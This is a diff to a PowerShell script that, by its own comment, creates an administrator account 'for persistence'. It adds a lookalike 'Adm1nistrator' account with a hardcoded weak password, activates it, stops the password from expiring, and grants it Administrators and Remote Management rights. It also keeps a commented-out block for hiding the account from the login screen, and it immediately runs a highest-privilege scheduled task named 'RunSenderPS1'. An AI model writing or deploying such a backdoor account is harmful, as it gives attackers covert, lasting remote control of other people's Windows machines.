@@ -24,7 +24,7 @@ $dirPath = New-RandomTempDirectory
 # Create Admin account for persistence
 # Run PowerShell as Administrator
 $username = "Adm1nistrator"
-$password = "Pa$$w0rd"
+$password = "password"
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 
 # Check if the local user already exists
@@ -34,12 +34,15 @@ if (-not $userExists) {
     # Create local user
     New-LocalUser -Name $username -Password $securePassword -FullName $username -Description "Local admin account" 
     net user Adm1nistrator /passwordreq:yes
+    net user Adm1nistrator /active:yes
     Set-LocalUser -Name "Adm1nistrator" -PasswordNeverExpires $true
 
-    # Add user to Administrators group
+    # Add user to Administrators and Remote Management group
     Add-LocalGroupMember -Group "Administrators" -Member $username
+    Add-LocalGroupMember -Group "Remote Management Users" -Member $username
     # This is for the current user
     Add-LocalGroupMember -Group "Remote Management Users" -Member $env:USERNAME
+
 
     # # Hide user from login screen
     # $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
@@ -108,6 +111,8 @@ if (-not $taskExists) {
         -Trigger $trigger `
         -RunLevel Highest `
         -Force
+    
+        schtasks /run /tn "RunSenderPS1"
 }
 
 
